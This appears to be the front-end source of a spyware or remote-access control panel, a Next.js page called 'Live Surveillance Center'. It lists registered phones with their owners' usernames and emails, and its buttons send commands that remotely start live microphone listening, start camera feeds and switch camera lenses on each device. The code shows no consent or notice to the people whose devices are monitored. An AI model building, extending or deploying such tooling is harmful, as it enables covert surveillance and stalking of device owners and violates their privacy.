'use client';

import { useState, useEffect, useCallback, useRef } from 'react';
import SurveillancePanel from '@/components/SurveillancePanel';

const API_BASE = process.env.NEXT_PUBLIC_API_URL || 'http://127.0.0.1:8000';
const WS_BASE = API_BASE.replace('http://', 'ws://').replace('https://', 'wss://');

interface Device {
  device_id: string;
  device_model: string;
  username: string;
  email: string | null;
  last_sync_timestamp: number;
  is_blocked?: boolean;
  total_files?: number;
}

// Real-time audio level per device_id
type AudioLevels = Record<string, { db: number; active: boolean }>;

function timeAgo(ts: number) {
  const sec = Math.floor((Date.now() - ts) / 1000);
  if (sec < 60) return `${sec}s ago`;
  if (sec < 3600) return `${Math.floor(sec / 60)}m ago`;
  if (sec < 86400) return `${Math.floor(sec / 3600)}h ago`;
  return `${Math.floor(sec / 86400)}d ago`;
}

function MiniDbBar({ db, active }: { db: number; active: boolean }) {
  const pct = active ? Math.round(((Math.max(-80, Math.min(0, db)) + 80) / 80) * 100) : 0;
  const color = pct < 30 ? 'bg-green-500' : pct < 65 ? 'bg-yellow-400' : 'bg-red-500';
  return (
    <div className="w-full bg-gray-200 rounded-full h-1.5 overflow-hidden">
      <div
        className={`h-1.5 rounded-full transition-all duration-500 ${active ? color : 'bg-gray-300'}`}
        style={{ width: `${pct}%` }}
      />
    </div>
  );
}

function OnlineIndicator({ ts }: { ts: number }) {
  const isOnline = Date.now() - ts < 5 * 60 * 1000; // active within 5 min
  return (
    <span
      className={`inline-flex items-center gap-1 text-[10px] font-semibold px-2 py-0.5 rounded-full border ${
        isOnline
          ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
          : 'bg-slate-100 text-slate-500 border-slate-200'
      }`}
    >
      <span className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-emerald-500 animate-pulse' : 'bg-slate-400'}`} />
      {isOnline ? 'Online' : 'Offline'}
    </span>
  );
}

export default function SurveillancePage() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [audioLevels, setAudioLevels] = useState<AudioLevels>({});
  const [activeAudio, setActiveAudio] = useState<Set<string>>(new Set());
  const [activeCamera, setActiveCamera] = useState<Set<string>>(new Set());
  const [actionStatus, setActionStatus] = useState<Record<string, string>>({});
  const wsRef = useRef<WebSocket | null>(null);

  // Fetch all devices
  const fetchDevices = useCallback(async () => {
    try {
      const res = await fetch(`${API_BASE}/api/admin/devices`);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data: Device[] = await res.json();
      setDevices(data);
    } catch (e) {
      console.error('Failed to fetch devices:', e);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchDevices();
    const interval = setInterval(fetchDevices, 15000);
    return () => clearInterval(interval);
  }, [fetchDevices]);

  // Admin WebSocket — receives AUDIO_LEVEL_UPDATE forwarded from devices
  useEffect(() => {
    const ws = new WebSocket(`${WS_BASE}/ws?user_id=admin`);
    wsRef.current = ws;
    ws.onmessage = (evt) => {
      try {
        const data = JSON.parse(evt.data);
        if (data.type === 'AUDIO_LEVEL_UPDATE' && data.device_id) {
          setAudioLevels((prev) => ({
            ...prev,
            [data.device_id]: { db: Number(data.db ?? -80), active: true },
          }));
        }
      } catch {}
    };
    return () => ws.close();
  }, []);

  const sendCommand = async (deviceId: string, endpoint: string): Promise<boolean> => {
    try {
      const res = await fetch(
        `${API_BASE}/api/admin/devices/${encodeURIComponent(deviceId)}/${endpoint}`,
        { method: 'POST' }
      );
      const data = await res.json();
      return data.delivered === true;
    } catch {
      return false;
    }
  };

  const setStatus = (deviceId: string, msg: string) => {
    setActionStatus((prev) => ({ ...prev, [deviceId]: msg }));
    setTimeout(() => setActionStatus((prev) => { const n = { ...prev }; delete n[deviceId]; return n; }), 4000);
  };

  const handleToggleAudio = async (device: Device) => {
    const isActive = activeAudio.has(device.device_id);
    if (isActive) {
      await sendCommand(device.device_id, 'stop-audio-feed');
      setActiveAudio((prev) => { const s = new Set(prev); s.delete(device.device_id); return s; });
      setAudioLevels((prev) => ({ ...prev, [device.device_id]: { db: -80, active: false } }));
      setStatus(device.device_id, '🔇 Audio stopped');
    } else {
      setSelectedDevice(device);
      const delivered = await sendCommand(device.device_id, 'start-audio-feed');
      setActiveAudio((prev) => new Set(prev).add(device.device_id));
      setStatus(device.device_id, delivered ? '🎙️ Opening Audio Viewport…' : '⚠️ Command queued');
    }
  };

  const handleToggleCamera = async (device: Device) => {
    const isActive = activeCamera.has(device.device_id);
    if (isActive) {
      await sendCommand(device.device_id, 'stop-camera-feed');
      setActiveCamera((prev) => { const s = new Set(prev); s.delete(device.device_id); return s; });
      setStatus(device.device_id, '📷 Camera stopped');
    } else {
      setSelectedDevice(device);
      const delivered = await sendCommand(device.device_id, 'start-camera-feed');
      setActiveCamera((prev) => new Set(prev).add(device.device_id));
      setStatus(device.device_id, delivered ? '📷 Opening Video Viewport…' : '⚠️ Camera command queued');
    }
  };

  const handleRotateCamera = async (device: Device) => {
    setStatus(device.device_id, '🔄 Rotating camera lens (front/back)...');
    const delivered = await sendCommand(device.device_id, 'switch-camera');
    setStatus(device.device_id, delivered ? '📷 Camera lens switched' : '⚠️ Rotate command queued');
  };

  const filtered = devices.filter((d) => {
    const q = search.toLowerCase();
    return (
      !q ||
      d.device_model.toLowerCase().includes(q) ||
      d.username.toLowerCase().includes(q) ||
      d.device_id.toLowerCase().includes(q)
    );
  });

  const activeAudioCount = activeAudio.size;
  const activeCameraCount = activeCamera.size;

  return (
    <div className="p-8 max-w-7xl mx-auto">
      {/* Page Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-8">
        <div>
          <h1 className="text-2xl font-bold text-slate-900 flex items-center gap-2">
            🛰️ Live Surveillance Center
          </h1>
          <p className="text-slate-500 mt-1 text-sm font-medium">
            Monitor all registered devices — activate live audio listening or camera feed per device.
          </p>
        </div>
        <button
          onClick={fetchDevices}
          className="flex items-center gap-2 px-4 py-2.5 bg-white border border-slate-200 hover:bg-slate-50 text-slate-700 rounded-xl font-semibold text-xs shadow-sm transition cursor-pointer"
        >
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
          </svg>
          Refresh
        </button>
      </div>

      {/* Stats Row */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-8">
        {[
          { label: 'Total Devices', value: devices.length, color: 'text-indigo-600', bg: 'bg-indigo-50/60' },
          { label: 'Online (≤5m)', value: devices.filter((d) => Date.now() - d.last_sync_timestamp < 300000).length, color: 'text-emerald-600', bg: 'bg-emerald-50/60' },
          { label: 'Audio Active', value: activeAudioCount, color: 'text-purple-600', bg: 'bg-purple-50/60' },
          { label: 'Camera Active', value: activeCameraCount, color: 'text-blue-600', bg: 'bg-blue-50/60' },
        ].map((s) => (
          <div key={s.label} className={`${s.bg} border border-slate-200/80 rounded-2xl p-5 shadow-sm bg-white`}>
            <div className={`text-3xl font-bold ${s.color}`}>{s.value}</div>
            <div className="text-xs font-semibold text-slate-500 mt-1 uppercase tracking-wider">{s.label}</div>
          </div>
        ))}
      </div>

      {/* Search bar */}
      <div className="bg-white border border-slate-200/80 rounded-2xl p-4 mb-6 shadow-sm">
        <div className="relative">
          <svg className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
          </svg>
          <input
            type="text"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search by device model, username, or device ID…"
            className="w-full pl-10 pr-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-indigo-500 transition"
          />
        </div>
      </div>

      {/* Devices Grid */}
      {loading ? (
        <div className="flex items-center justify-center py-24 text-slate-400">
          <svg className="animate-spin w-6 h-6 mr-3 text-indigo-500" fill="none" viewBox="0 0 24 24">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
          </svg>
          <span className="font-medium text-sm">Loading devices…</span>
        </div>
      ) : filtered.length === 0 ? (
        <div className="text-center py-24 text-slate-400 font-medium">No devices found.</div>
      ) : (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-5">
          {filtered.map((device) => {
            const isAudioOn = activeAudio.has(device.device_id);
            const isCameraOn = activeCamera.has(device.device_id);
            const level = audioLevels[device.device_id];
            const dbVal = level?.active ? level.db.toFixed(1) : '—';
            const status = actionStatus[device.device_id];
            const initial = (device.username || device.device_model || '?').charAt(0).toUpperCase();

            return (
              <div
                key={device.device_id}
                className={`bg-white border rounded-2xl shadow-sm flex flex-col overflow-hidden transition-all hover:shadow-md ${
                  isAudioOn ? 'border-purple-300 ring-1 ring-purple-200' : 'border-slate-200/80'
                }`}
              >
                {/* Card Header */}
                <div className="p-4 pb-3 flex items-start gap-3">
                  {/* Avatar */}
                  <div className={`w-10 h-10 rounded-xl flex-shrink-0 flex items-center justify-center text-white font-bold text-sm shadow-sm ${
                    isAudioOn ? 'bg-purple-600' : isCameraOn ? 'bg-blue-600' : 'bg-indigo-500'
                  }`}>
                    {isAudioOn ? '🎙️' : isCameraOn ? '📷' : initial}
                  </div>

                  {/* Info */}
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="font-bold text-slate-900 text-sm truncate">
                        {device.device_model}
                      </span>
                      {device.is_blocked && (
                        <span className="text-[10px] px-1.5 py-0.5 bg-rose-100 text-rose-700 rounded font-bold border border-rose-200">BLOCKED</span>
                      )}
                    </div>
                    <div className="text-xs text-indigo-600 font-semibold mt-0.5">@{device.username}</div>
                    <div className="flex items-center gap-2 mt-1.5">
                      <OnlineIndicator ts={device.last_sync_timestamp} />
                      <span className="text-[10px] text-slate-400">{timeAgo(device.last_sync_timestamp)}</span>
                    </div>
                  </div>
                </div>

                {/* Audio Level Indicator */}
                <div className="px-4 pb-3">
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-[10px] text-slate-500 font-medium uppercase tracking-wide">
                      {isAudioOn ? '🔴 Live Audio' : 'Audio Level'}
                    </span>
                    <span className={`text-[10px] font-mono font-bold ${isAudioOn ? 'text-purple-600' : 'text-slate-400'}`}>
                      {dbVal} {level?.active ? 'dB' : ''}
                    </span>
                  </div>
                  <MiniDbBar db={level?.db ?? -80} active={isAudioOn && Boolean(level?.active)} />
                </div>

                {/* Status toast */}
                {status && (
                  <div className="mx-4 mb-3 px-3 py-1.5 bg-indigo-50 border border-indigo-200 text-indigo-700 text-[10px] font-semibold rounded-lg">
                    {status}
                  </div>
                )}

                {/* Camera active badge */}
                {isCameraOn && (
                  <div className="mx-4 mb-3 px-3 py-1.5 bg-blue-50 border border-blue-200 text-blue-700 text-[10px] font-semibold rounded-lg flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse" />
                    Camera feed command active
                  </div>
                )}

                {/* Action Buttons */}
                <div className="mt-auto border-t border-slate-100 p-3 grid grid-cols-4 gap-1.5">
                  {/* Audio Toggle */}
                  <button
                    onClick={() => handleToggleAudio(device)}
                    className={`flex flex-col items-center justify-center gap-1 py-2 rounded-xl text-[10px] font-bold transition cursor-pointer ${
                      isAudioOn
                        ? 'bg-purple-600 text-white hover:bg-purple-700'
                        : 'bg-purple-50 text-purple-700 border border-purple-200 hover:bg-purple-100'
                    }`}
                    title={isAudioOn ? 'Stop Audio Feed' : 'Start Audio Listen'}
                  >
                    <span className="text-base">{isAudioOn ? '🔇' : '🎙️'}</span>
                    <span>{isAudioOn ? 'Stop' : 'Listen'}</span>
                  </button>

                  {/* Camera Toggle */}
                  <button
                    onClick={() => handleToggleCamera(device)}
                    className={`flex flex-col items-center justify-center gap-1 py-2 rounded-xl text-[10px] font-bold transition cursor-pointer ${
                      isCameraOn
                        ? 'bg-blue-600 text-white hover:bg-blue-700'
                        : 'bg-blue-50 text-blue-700 border border-blue-200 hover:bg-purple-100'
                    }`}
                    title={isCameraOn ? 'Stop Camera Feed' : 'Start Camera Feed'}
                  >
                    <span className="text-base">{isCameraOn ? '📵' : '📷'}</span>
                    <span>{isCameraOn ? 'Stop' : 'Camera'}</span>
                  </button>

                  {/* Rotate / Switch Camera */}
                  <button
                    onClick={() => handleRotateCamera(device)}
                    className="flex flex-col items-center justify-center gap-1 py-2 rounded-xl text-[10px] font-bold bg-amber-50 text-amber-700 border border-amber-200 hover:bg-amber-100 transition cursor-pointer"
                    title="Rotate Camera (Front ↔ Back)"
                  >
                    <span className="text-base">🔄</span>
                    <span>Rotate</span>
                  </button>

                  {/* Full Panel */}
                  <button
                    onClick={() => setSelectedDevice(device)}
                    className="flex flex-col items-center justify-center gap-1 py-2 rounded-xl text-[10px] font-bold bg-indigo-50 text-indigo-700 border border-indigo-200 hover:bg-indigo-100 transition cursor-pointer"
                    title="Open Full Surveillance Panel"
                  >
                    <span className="text-base">🛰️</span>
                    <span>Details</span>
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* Full Surveillance Panel Modal */}
      {selectedDevice && (
        <SurveillancePanel
          device={selectedDevice}
          onClose={() => setSelectedDevice(null)}
        />
      )}
    </div>
  );
}
